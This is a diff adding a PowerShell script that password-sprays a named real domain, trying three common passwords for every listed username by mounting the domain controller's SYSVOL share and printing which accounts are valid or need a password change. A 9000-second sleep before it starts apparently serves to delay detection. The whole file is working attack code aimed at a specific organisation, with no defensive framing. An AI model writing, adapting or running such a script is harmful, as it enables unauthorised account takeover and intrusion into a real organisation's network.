@@ -1,0 +1,59 @@
+$passwords = @(
+    "Aa123456",
+    "Az123456",
+    "qwerty123"
+)
+
+Write-Host "Sleeping before starting..." -ForegroundColor Cyan
+Start-Sleep -Seconds 9000
+Write-Host "Starting now..." -ForegroundColor Green
+
+foreach ($password in $passwords){
+    Write-Host "--------- Curent Password $password ---------" -ForegroundColor Cyan
+    $users = Get-Content ".\usernames.txt"
+    $domain = "iai.co.il"
+    $target = "\\IAIES1\SYSVOL"
+
+    foreach ($username in $users) {
+
+    $username = $username.Trim()
+
+    # ניקוי SMB sessions קודמות
+    cmd.exe /c "net use * /delete /y" | Out-Null
+
+    try {
+
+        $secure = ConvertTo-SecureString $password -AsPlainText -Force
+
+        $cred = New-Object System.Management.Automation.PSCredential(
+            "$domain\$username",
+            $secure
+        )
+
+        New-PSDrive -Name "Z" `
+            -PSProvider FileSystem `
+            -Root $target `
+            -Credential $cred `
+            -ErrorAction Stop | Out-Null
+
+        Write-Host "[+] $username : VALID" -ForegroundColor Green
+
+        Remove-PSDrive Z -Force -ErrorAction SilentlyContinue
+    }
+    catch {
+
+        $msg = $_.Exception.Message
+
+        if ($msg -match "must be changed") {
+            Write-Host "[!] $username : MUST CHANGE PASSWORD" -ForegroundColor Yellow
+        }
+        elseif ($msg -match "user name or password is incorrect") {
+            Write-Host "[-] $username : INVALID" -ForegroundColor Red
+        }
+        else {
+            Write-Host "[-] $username : ERROR" -ForegroundColor Magenta
+            Write-Host "    $msg"
+        }
+    }
+}
+}
